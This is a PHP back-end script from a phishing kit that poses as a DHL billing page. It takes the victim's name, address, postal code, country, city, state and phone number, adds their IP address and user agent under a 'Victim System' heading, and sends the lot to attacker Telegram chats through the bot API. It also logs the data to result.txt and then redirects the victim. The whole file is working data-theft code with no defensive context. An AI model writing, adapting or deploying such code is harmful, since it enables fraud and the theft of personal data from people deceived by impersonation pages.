<?php
session_start();
include '../config/tg.php';
if(isset($_POST['log'])){
foreach($IdTelegram as $chatId) {
$ip = getenv("REMOTE_ADDR"); 
$message = "|==[ INTERN. - DHL BILLING  ]==|\n";
$message .= "|Full Name  :  ".$_POST['first_name']." ".$_POST['last_name']."\n";
$message .= "|ADR1  :  ".$_POST['line_1']."\n";
$message .= "|ADR2  :  ".$_POST['line_2']."\n";
$message .= "|ZIP  :  ".$_POST['postal_code']."\n";
$message .= "|COUNTRY  :  ".$_POST['cntry']."\n";
$message .= "|CITY  :  ".$_POST['city']."\n";
$message .= "|STATE  :  ".$_POST['state']."\n";
$message .= "|Phone Number  :  ".$_POST['phones']."\n";
$message .= "|==[ 💻 Victim System 💻  ]==|\n";
$message .= "|IP                 :  ".$ip."\n";
$message .= "|User-Agent         :  ".$UA."\n";
$message .= "|Date               :  ".date('d/m/Y h:i:s')."\n";
$message .= "|==[ 💻 Victim System 💻  ]==|\n";
$website="https://api.telegram.org/bot".$botToken;
$params=[
'chat_id'=>$chatId, 
'text'=>$message,
];
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);
$myfile = fopen("result.txt", "a+");
$txt = $message;
fwrite($myfile, $txt);
fclose($myfile);
header("location: ../load.php?code=action1");
}
}
else{
  exit("");
}
?>